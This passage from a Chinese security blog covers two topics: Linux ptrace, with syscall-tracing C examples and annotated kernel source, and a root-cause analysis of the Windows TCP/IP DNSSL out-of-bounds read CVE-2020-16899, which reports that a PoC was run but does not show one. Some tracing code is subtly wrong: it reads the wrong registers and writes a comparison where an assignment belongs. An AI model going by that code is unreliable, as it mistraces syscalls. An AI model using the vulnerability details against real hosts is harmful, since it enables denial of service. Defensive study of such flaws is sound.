%ld.\\n\", orig_rax); /*Continue*/ ptrace(PTRACE_CONT, child, NULL, NULL); } return 0; } 运行结果如下： 打印出系统调用号，并等待用户输入。查看/usr/include/x86_64-linux-gnu/asm/unistd_64.h文件（64位系统）查看59对应的系统调用： 59号恰好为execve函数调用。对上面的过程进行简单总结： 父进程通过调用fork()来创建子进程，在子进程中，执行execl()之前，先运行ptrace()，request参数设置为PTRACE_TRACEME来告诉kernel当前进程正在被trace。当有信号量传递到该进程，进程会stop，提醒父进程在wait()调用处继续执行。然后调用execl()，执行成功后，新程序运行前，SIGTRAP信号量被发送到该进程，子进程停止，父进程在wait()调用处收到通知，获取子进程的控制权，查看子进程内存和寄存器相关信息。 当发生系统调用时，kernel保存了rax寄存器的原始内容，其中存放的是系统调用号，我们可以使用request参数为PTRACE_PEEKUSER的ptrace来从子进程的USER段读取出该值。 系统调用检查结束后，子进程通过调用request参数为PTRACE_CONT的ptrace函数继续执行。 2. 系统调用查看参数 #include \u003csys/ptrace.h\u003e #include \u003csys/types.h\u003e #include \u003csys/wait.h\u003e #include \u003cunistd.h\u003e #include \u003csys/user.h\u003e #include \u003csys/reg.h\u003e #include \u003cstdio.h\u003e #include \u003csys/syscall.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); execl(\"/bin/ls\", \"ls\", NULL); }else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall = 1; params[0] = ptrace(PTRACE_PEEKUSER, child, 8 * RBX, NULL); params[1] = ptrace(PTRACE_PEEKUSER, child, 8 * RCX, NULL); params[2] = ptrace(PTRACE_PEEKUSER, child, 8 * RDX, NULL); printf(\"Write called with %ld, %ld, %ld\\n\", params[0], params[1], params[2]); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8 * RAX, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } 执行结果： 在上面的程序中，跟踪的是wirte的系统调用，ls命令总计进行了三次write的调用。request参数为PTEACE_SYSCALL时的ptrace使kernel在进行系统调用进入或退出时stop子进程，这等价于执行PTRACE_CONT并在下一次系统调用进入或退出时stop。 wait系统调用中的status变量用于检查子进程是否已退出，这是用来检查子进程是否被ptrace停掉或是否退出的典型方法。而宏WIFEXITED则表示了子进程是否正常结束（例如通过调用exit或者从main返回等），正常结束时返回true。 3. 系统调用参数-改进版 前面有介绍PTRACE_GETREGS参数，使用它来获取寄存器的值相比前面一种方法要简单很多： #include \u003cstdio.h\u003e #include \u003csys/reg.h\u003e #include \u003csys/user.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/ptrace.h\u003e #include \u003csys/syscall.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; struct user_regs_struct regs; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, child, 8 * ORIG_RAX, NULL); execl(\"/bin/ls\", \"ls\", NULL); } else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall == 1; ptrace(PTRACE_GETREGS, child, NULL, \u0026regs); printf(\"Write called with %lld, %lld, %lld\\n\", regs.rbx, regs.rcx, regs.rdx); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8*rax, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } 执行结果： 整体输出与前面的代码无所差别，但在代码开发上使用了PTRACE_GETREGS来获取子进程的寄存器的值，简洁了很多。 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:3","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"三、sys_ptrace函数源码分析 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:3:0","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"1. Linux-2.6版本的源码分析 1. 源码分析 首先看一下linux-2.6.0的sys_ptrace的处理流程（以/arch/i386/kernel/ptrace.c为例）： /* * Note that this implementation of ptrace behaves differently from vanilla * ptrace. Contrary to what the man page says, in the PTRACE_PEEKTEXT, * PTRACE_PEEKDATA, and PTRACE_PEEKUSER requests the data variable is not * ignored. Instead, the data variable is expected to point at a location * (in user space) where the result of the ptrace call is written (instead of * being returned). */ asmlinkage int sys_ptrace(long request, long pid, long addr, long data) { struct task_struct *child; struct user * dummy = NULL; int i, ret; lock_kernel(); ret = -EPERM; if (request == PTRACE_TRACEME) { // 请求为PTRACE_TRACEME /* 检查是否做好被跟踪的准备 */ if (current-\u003eptrace \u0026 PT_PTRACED) goto out; ret = security_ptrace(current-\u003eparent, current); if (ret) goto out; /* 检查通过，在process flags中设置ptrace位*/ current-\u003eptrace |= PT_PTRACED; ret = 0; goto out; } /* 非PTRACE_TRACEME的请求*/ ret = -ESRCH; // 首先设置返回值为ESRCH，表明没有该进程，宏定义在errno-base.h头文件中 read_lock(\u0026tasklist_lock); child = find_task_by_pid(pid); // 查找task结构 if (child) get_task_struct(child); read_unlock(\u0026tasklist_lock); if (!child) // 没有找到task结构，指明所给pid错误 goto out; ret = -EPERM; // 返回操作未授权 if (pid == 1) // init进程不允许被调试 goto out_tsk; /* 请求为 PTRACE_ATTACH 时*/ if (request == PTRACE_ATTACH) { ret = ptrace_attach(child); // 进行attach goto out_tsk; } /* 检查进程是否被跟踪，没有的话不能执行其他功能； * 当不是PTRACE_KILL时，要求进程状态为TASK_STOPPED； * 被跟踪进程必须为当前进程的子进程 * 在之前是直接在该代码处实现以上逻辑，现在重新将以上功能封装成了ptrace_check_attach函数 */ ret = ptrace_check_attach(child, request == PTRACE_KILL); if (ret \u003c 0) goto out_tsk; /* 以下就为根据不同的request参数进行对应的处理了，用一个switch来总括，流程比较简单。*/ switch (request) { /* when I and D space are separate, these will need to be fixed. 这算预告吗？23333*/ case PTRACE_PEEKTEXT: /* read word at location addr. */ case PTRACE_PEEKDATA: { unsigned long tmp; int copied; copied = access_process_vm(child, addr, \u0026tmp, sizeof(tmp), 0); ret = -EIO; // 返回I/O错误 if (copied != sizeof(tmp)) break; ret = put_user(tmp,(unsigned long *) data); break; } /* read the word at location addr in the USER area. */ case PTRACE_PEEKUSR: { unsigned long tmp; ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; tmp = 0; /* Default return condition */ if(addr \u003c FRAME_SIZE*sizeof(long)) tmp = getreg(child, addr); if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ addr -= (long) \u0026dummy-\u003eu_debugreg[0]; addr = addr \u003e\u003e 2; tmp = child-\u003ethread.debugreg[addr]; } ret = put_user(tmp,(unsigned long *) data); break; } /* when I and D space are separate, this will have to be fixed. */ case PTRACE_POKETEXT: /* write the word at location addr. */ case PTRACE_POKEDATA: ret = 0; if (access_process_vm(child, addr, \u0026data, sizeof(data), 1) == sizeof(data)) break; ret = -EIO; break; case PTRACE_POKEUSR: /* write the word at location addr in the USER area */ ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; if (addr \u003c FRAME_SIZE*sizeof(long)) { ret = putreg(child, addr, data); break; } /* We need to be very careful here. We implicitly want to modify a portion of the task_struct, and we have to be selective about what portions we allow someone to modify. */ ret = -EIO; if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ if(addr == (long) \u0026dummy-\u003eu_debugreg[4]) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[5]) break; if(addr \u003c (long) \u0026dummy-\u003eu_debugreg[4] \u0026\u0026 ((unsigned long) data) \u003e= TASK_SIZE-3) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[7]) { data \u0026= ~DR_CONTROL_RESERVED; for(i=0; i\u003c4; i++) if ((0x5f54 \u003e\u003e ((data \u003e\u003e (16 + 4*i)) \u0026 0xf)) \u0026 1) goto out_tsk; } addr -= (long) \u0026dummy-\u003eu_debugreg; addr = addr \u003e\u003e 2; child-\u003ethread.debugreg[addr] = data; ret = 0; } break; case PTRACE_SYSCALL: /* continue and stop at next (return from) syscall */ case PTRACE_CONT: { /* restart after signal. */ long tmp; ret = -EIO; if ((unsigned long) data \u003e _NSIG) break; if (request == PTRACE_SYSCALL) { set_tsk_thread_flag","date":"2020-10-27","objectID":"/2020/10/ptrace/:3:1","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. Linux-5.9版本的源码分析 1. 源码分析 Linux-5.9版本的源码分析： SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { // 请求是否为PTRACE_TRACEME ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); // 通过pid请求task结构 if (!child) { // 请求失败，返回ESRCH ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; /* 根据不同的架构进行不同的处理 */ ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 2. 流程梳理 梳理上述源码，可以得到函数流程图如下： 3. 其他 Linux-5.9中使用了宏的方式，在进行函数调用时先进行函数替换解析出完整的函数体再进行具体执行（详细替换可参考系列（一）中的函数定义部分内容）。而且与Linux-2.6不同的是，kernel/ptrace.c负责总体调度，使用arch_ptrace进行不同架构的处理的选择： Linux-5.9版本的这种改动相比Linux-2.6的设计，更为清晰也更为安全（个人十分喜欢这种设计，由衷佩服这些优秀的开发者）。 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:3:2","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"四、Request参数详解 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:4:0","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"1. 参数简述 ptrace总计有4个参数，其中比较重要的是第一个参数–request，该参数决定了具体执行的系统调用功能。可取值如下（部分）： Request Description PTRACE_TRACEME 进程被其父进程跟踪，其父进程应该希望跟踪子进程。该值仅被tracee使用，其余的request值仅被tracer使用 PTRACE_PEEKTEXT, PTRACE_PEEKDATA 从tracee的addr指定的内存地址中读取一个字节作为ptrace()调用的结果 PTRACE_PEEKUSER 从tracee的USER区域中便宜为addr处读取一个字节，该值保存了进程的寄存器和其他信息 PTRACE_POKETEXT, PTRACE_POKEDATA 向tracee的addr内存地址处复制一个字节数据 PTRACE_POKEUSER 向tracee的USER区域中偏移为addr地址处复制一个字节数据 PTRACE_GETREGS 复制tracee的通用寄存器到tracer的data处 PTRACE_GETFPREGS 复制tracee的浮点寄存器到tracer的data处 PTRACE_GETREGSET 读取tracee的寄存器 PTRACE_SETREGS 设置tracee的通用寄存器 PTRACE_SETFPREGS 设置tracee的浮点寄存器 PTRACE_CONT 重新运行stopped状态的tracee进程 PTRACE_SYSCALL 重新运行stopped状态的tracee进程，但是使tracee在系统调用的下一个entry或从系统调用退出或在执行一条指令后stop PTRACE_SINGLESTEP 设置单步执行标志 PTRACE_ATTACH 跟踪指定pid的进程 PTRACE_DETACH 结束跟踪 备注：上述参数中，PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_GETFPREGS, PTRACE_SETFPREGS参数为Interl386特有。 各参数所代表的值由/usr/include/sys/ptrace.h文件指定： ","date":"2020-10-27","objectID":"/2020/10/ptrace/:4:1","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. 重要参数详解 下面将对request中几个常见、重要的参数进行详细解析： 1. PTRACE_TRACEME 描述 本进程被其父进程跟踪，如果子进程没有被其父进程跟踪，不能使用该选项。PTRACE_TRACEME 只被tracee使用。 定义 /** * ptrace_traceme -- helper for PTRACE_TRACEME * * Performs checks and sets PT_PTRACED. * Should be used by all ptrace implementations for PTRACE_TRACEME. */ static int ptrace_traceme(void) { int ret = -EPERM; write_lock_irq(\u0026tasklist_lock); // 首先让writer拿到读写lock，并且会disable local irp /* Are we already being traced? */ // 是否已经处于ptrace中 if (!current-\u003eptrace) { ret = security_ptrace_traceme(current-\u003eparent); /* * Check PF_EXITING to ensure -\u003ereal_parent has not passed * exit_ptrace(). Otherwise we don't report the error but * pretend -\u003ereal_parent untraces us right after return. */ if (!ret \u0026\u0026 !(current-\u003ereal_parent-\u003eflags \u0026 PF_EXITING)) { // 检查通过，将子进程链接到父进程的ptrace链表中 current-\u003eptrace = PT_PTRACED; ptrace_link(current, current-\u003ereal_parent); } } write_unlock_irq(\u0026tasklist_lock); return ret; } 分析 通过分析源码我们可以明确看到，PTRACE_TRACEME并没有真正使子进程停止。它内部完成的操作只有对父进程是否能对子进程进行trace的合法性检查，然后将子进程链接到父进程的饿ptrace链表中。真正导致子进程停止的是exec系统调用。 在系统调用成功后，kernel会判断该进程是否被ptrace跟踪。如果处于跟踪状态，kernel将会向该进程发送SIGTRAP信号，正是该信号导致了当前进程的停止。 /** * ptrace_event - possibly stop for a ptrace event notification * @event: %PTRACE_EVENT_* value to report * @message: value for %PTRACE_GETEVENTMSG to return * * Check whether @event is enabled and, if so, report @event and @message * to the ptrace parent. * * Called without locks. */ static inline void ptrace_event(int event, unsigned long message) { if (unlikely(ptrace_event_enabled(current, event))) { current-\u003eptrace_message = message; ptrace_notify((event \u003c\u003c 8) | SIGTRAP); } else if (event == PTRACE_EVENT_EXEC) { /* legacy EXEC report via SIGTRAP */ if ((current-\u003eptrace \u0026 (PT_PTRACED|PT_SEIZED)) == PT_PTRACED) send_sig(SIGTRAP, current, 0); } } 在exec.c中对该函数的调用如下： static int exec_binprm(struct linux_binprm *bprm) { pid_t old_pid, old_vpid; int ret, depth; /* Need to fetch pid before load_binary changes it */ old_pid = current-\u003epid; rcu_read_lock(); old_vpid = task_pid_nr_ns(current, task_active_pid_ns(current-\u003eparent)); rcu_read_unlock(); ....... audit_bprm(bprm); trace_sched_process_exec(current, old_pid, bprm); // 调用ptrace_event,传入的event为PTRACE_EVENT_EXEC // 直接走发送SIGTRAP的逻辑 ptrace_event(PTRACE_EVENT_EXEC, old_vpid); proc_exec_connector(current); return 0; } SIGTRAP信号的值为5，专门为调试设计。当kernel发生int 3时，触发回掉函数do_trap()，其代码如下： asmlinkage void do_trap(struct pt_regs *regs, unsigned long address) { force_sig_fault(SIGTRAP, TRAP_TRACE, (void __user *)address); regs-\u003epc += 4; } int force_sig_fault(int sig, int code, void __user *addr ___ARCH_SI_TRAPNO(int trapno) ___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)) { return force_sig_fault_to_task(sig, code, addr ___ARCH_SI_TRAPNO(trapno) ___ARCH_SI_IA64(imm, flags, isr), current); } 父进程唤醒wait对子进程进行监控，wait有3种退出情况（子进程正常退出、收到信号退出、收到信号暂停），对于PTRACE_TRACEME来说，对应的是第三种情况–收到信号后暂停。 PTRACE_TRACEME只是表明了子进程可以被trace，如果进程调用了PTRACE_TRACEME，那么该进程处理信号的方式会发生改变。例如一个进程正在运行，此时输入ctrl+c(SIGINT),则进程会直接退出；如果进程中有ptrace (PTRACE_TRACEME,0，NULL,NULL)，当输入CTRL+C时，该进程将会处于stopped的状态。 在sys_ptrace函数中，该部分的处理流程如下： 在5.9版中，单独写成了ptrace_traceme()函数，而在2.6版本中，直接在sys_ptrace的逻辑中进行实现： 虽然2个版本的核心功能相同，但是5.9版本的处理逻辑和情况考量相比2.6版本上升了很大高度。 2. PTRACE_ATTACH 描述 attach到pid指定的进程，使其成为调用进程的tracee。tracer会向tracee发送一个SIGSTOP信号，但不一定已通过此调用完成而停止；tracer使用waitpid()等待tracee停止。 定义 static int ptrace_attach(struct task_struct *task, long request, unsigned long addr, unsigned long flags) { bool seize = (request == PTRACE_SEIZE); int retval; retval = -EIO; /* I/O error*/ /* * 判断request是PTRACE_SEIZE还是PTRACE_ATTACH。 * 如果request为PTRACE_SEIZE，则进行必要的参数检查，错误时退出。 */ if (seize) { if (addr != 0) goto out; if (flags \u0026 ~(unsigned long)PTRACE_O_MASK) goto out; flags = PT_PTRACED | PT_SEIZED | (flags \u003c\u003c PT_OPT_FLAG_SHIFT); } else { flags = PT_PTRACED; } audit_ptrace(task); /* * 判断task进程是否为kernel thread（PF_KTHREAD）， * 调用same_thread_group(task, current)，判断task是否和current进程在同一个线程组，查看current进程是否有权限trace task进程。 * 如果不符合要求，则直接退出。 */ retval = -EPERM; /*","date":"2020-10-27","objectID":"/2020/10/ptrace/:4:2","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析 [toc] ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:0:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows TCP/IP Denial of Service Vulnerability 漏洞编号：CVE-2020-16899 漏洞类型：Read out of Bound 漏洞影响：Denial of Service CVSS评分：7.5 利用难度：Medium 基础权限：不需要 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:1","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. 组件概述 TCP/IP是Internet上使用的通信协议。 在Windows的早期版本中，TCP/IP是一个单独的可选组件，可以像其他任何协议一样删除或添加。从Windows XP/Server 2003开始，TCP/IP成为操作系统的核心组件，无法删除。 将TCP/IP作为Windows的核心组件是非常有意义的，因为它的功能在Microsoft Windows Server上对网络操作和Active Directory域环境尤为重要。 整个Active Directory架构基于DNS层次结构，依赖于TCP/IP 传输协议 。 Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，并将其传递给更高级别的组件。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:2","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"3. 漏洞利用 该漏洞主要是由于Windows TCP/IP堆栈在处理选项类型为31(0x1f，DNS搜索表选项)的ICMPv6的路由广播数据包时，处理逻辑存在越界读，导致拒绝服务漏洞。攻击者成功利用该漏洞可使目标主机失去响应，但无法直接进行任意代码执行或权限提取。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:3","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"4. 漏洞影响 • Microsoft Windows 10 1709 • Microsoft Windows 10 1803 • Microsoft Windows 10 1809 • Microsoft Windows 10 1903 • Microsoft Windows 10 1909 • Microsoft Windows 10 2004 • Microsoft Windows Server 2019 • Microsoft Windows Server, version 1903 • Microsoft Windows Server, version 1909 • Microsoft Windows Server, version 2004 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:4","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"5. 解决方案 微软官方针对该漏洞已发布安全更新补丁，补丁地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:5","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:2:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. 环境搭建 靶机：Windows 10 1809 x64 靶机操作：使用verifier开启tcpip.sys的验证 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:2:1","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. 复现过程 通过各种手段获取目标主机的IPv6地址和MAC地址（具体方法可自行探索，较为简单） 攻击机python3运行poc： 靶机crash： ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:2:2","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:0","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. 基本信息 漏洞文件：tcpip.sys 漏洞函数： Ipv6pUpdateDNSSL()函数 漏洞对象：ICMPv6路由广播中的option结构(DNS Option structure) ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:1","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. 背景知识 (限于篇幅问题，此处不对用于DNS配置的IPv6路由广播进行详细介绍，更详细资料可参考RFC8106) 1. 基本知识 IPv6 Router Advertisment (RA) options，也称为DNS RA options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server Address(DNS递归路由器地址)列表和DNS Search List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。 IPv6 Neighbor Discovery(ND，IPv6邻居发现)和IPv6 Stateless Address Autoconfiguratioin(SLAAC，IPv6无状态地址自动配置)提供了使用一个或多个IPv6地址，默认路由器以及一些其他参数配置固定节点或移动节点的方法。 当漫游主机每次连接到另一个网络时，无法进行手动配置。 虽然可以进行静态配置，但是在诸如笔记本电脑之类的通用主机上通常不建议这样操作。 例如，如果主机运行直接连接到全局DNS的自己的递归名称服务器，那么本地定义的名称空间对主机来说就不可用了。访问DNS是几乎所有主机的基本要求，因此IPv6 SLAAC在没有任何DNS配置支持的情况下，不能在任何实际的网络环境中单独作为替代部署模型。 对于IPv4环境中的DNS服务器来说，这些问题都很容易解决。但是对于IPv6的网络环境，这些问题显得比较棘手。因此，RFC8106定义了一种基于DNS RA选项的机制，以允许IPv6主机执行自动DNS配置。 在通过IPv6 SLAAC自动配置IPv6主机地址并且没有DHCPv6基础结构或一些主机没有DHCPv6客户端的网络环境中，可以使用基于RA的DNS配置作为替代。 但是，对于需要分发其他信息的网络，可能仍然会使用DHCPv6。 在这些网络中，可能不需要基于RA的DNS配置。 基于RA的DNS配置允许IPv6主机获取主机连接到的链接的DNS配置（即DNS递归服务器地址和DNSSL）。 此外，主机会从提供链接配置信息的同一RA消息中学习此DNS配置。 2. 名词解释 Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。 RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option【RFC4861】。 DNS Search List (DNSSL)：IPv6主机在执行DNS查询搜索时使用的DNS后缀域名列表，用于搜索简短的不合格域名。 DNSSL Option：一个IPv6 RA选项，用于将DNSSL信息传递到IPv6主机。 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:2","tags":["漏洞"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"3. 详细分析 1. 基础分析 RFC8106标准化了DNSSL Option，该结构中包含DNS搜索列表(DNSSL)，保证与DHCPv6 option保持相同的奇偶校验，并确保具备确定搜索域的必要功能。 1. 邻居发现扩展 RFC8106中定义的在邻居发现中使用的IPv6 DNS配置算法需要用到2种ND options：RDNSS option和DNSSL option。与该漏洞相关的是DNSSL Option，另外一种则与 CVE-2020-16899相关。 2. DNSSL Option Structure DNSSL Option包含一个或多个DNS后缀，所有的domain name使用相同的Lifetime。如果需要不同的Lifetime值，则需要多个DNSSL Option结构。 DNSSL Option总体结构如下： Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bit，DNSSL Option type identifier，0x1f(31) 0x01 1 Length option长度（包括\"Type\"和\"Length\"字段），以8个八位位组为单位。最小值为2，此时option中仅有1个domain name。 0x02 2 Reserved 保留字段 0x04 4 Lifetime DNSSL中的domain name可用于名称解析的最长时间（以秒为单位）。默认情况下，该值至少为3 * MaxRtrAdvInterval，其中MaxRtrAdvInterval是RFC4861中定义的最大RA间隔。 0xffffffff表示无穷大， 零值意味着必须不再使用domain names。 0x08 8 Domain Names of DNS Search List 一个或多个domain name。 对于Length字段，如果option中仅有一个domain name，则为最小值为2。 Domain Names of DNS Search List字段中的domain name的编码要遵循RFC1035的3.1节中定义的格式： 多个domian name直接相连。 3. Procedure in IPv6 Hosts 当主机接收到RA消息中的DNS的options时，其处理过程如下： 首先检查Lengh字段的合法性：是否大于等于最小值2； 如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。 4. Crash分析 首先分析dmp文件，查看crash现场： CallStack直接给出了函数的调用链： Icmpv6ReceiveDatagrams() -\u003e Ipv6pHandleRouterAdvertisement() -\u003eIpv6pUpdateDNSSL() -\u003e GetNextSuffixFromOption() 最终是在GetNextSuffixFromOption()函数中报了内存页错误，导致最终的crash。 5. 漏洞原因 Windows IPv6堆栈为DNSSL中的每个domain name分配一个256字节的buffer。 RFC 1035将域名限制为255个字节，因此domain name长度加上末尾的空字符刚好可以满足buffer的大小要求。 但是，漏洞代码处理该部分数据时，其上限等于DNSSL Option中的剩余字节，可以超过256个字节。因此，漏洞代码可能会错误地消耗比为buffer分配的字节更多的字节，从而导致越界读。 如果buffer位于一个memory page的末尾，则该OOB读取就会导致BSOD。 2. 漏洞函数分析 分析使用的文件为Windows 10 1809 x64的tcpip.sys文件，版本为10.0.17763.316。 经过简单分析可以确认，调用链的顶层函数Icmpv6ReceiveDatagrams()没有实质性的与漏洞触发密切相关的处理逻辑，故而跳过。 1. Ipv6pHandleRouterAdvertisement() 在Ipv6pHandleRouterAdvertisement()函数中先对传入的RA消息做预处理，然后根据不同类型的option进入不同的处理流程： 2. Ipv6pUpdateDNSSL() 首先读取Option结构的数据以及Domain name的长度： 接下来，确认读取的数据后，处理后缀部分： 这里在计算Suffixes的长度时，BytesToRead会被限制在0x100字节长度范围内，也就是Suffixes的最大长度为256。然后调用GetNextSuffixFromOption()函数读取Suffix。 3. GetNextSuffixFromOption() 在该函数中，在解析完一个DNS记录后，代码逻辑会来到以下位置： 这里的主要作用是跳过Domain Name中的空字符部分，遇到0就跳过，读取下一个数据，直到遇到非0值。但是在进行边界检查时，使用的条件参数BytesToRead_1是可以进行控制的，从而可以实现绕过，进行越界读。 3. 动态分析 Ipv6pUpdateDNSSL()函数下断，然后发送poc后断下，检查CallStack，确认断点触发流程与静态分析中的函数调用链一致： 此时的各寄存器情况如下： 这里重点看下rdx寄存器中的内容（漏洞函数的第2个参数）： rdx中存放的是一个_NET_BUFFER结构，其详细结构如下： typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; 而且在其中找到了触发漏洞的ICMPv6的相关数据。继续向下，来到NdisGetDataBuffer()函数的第1处调用： 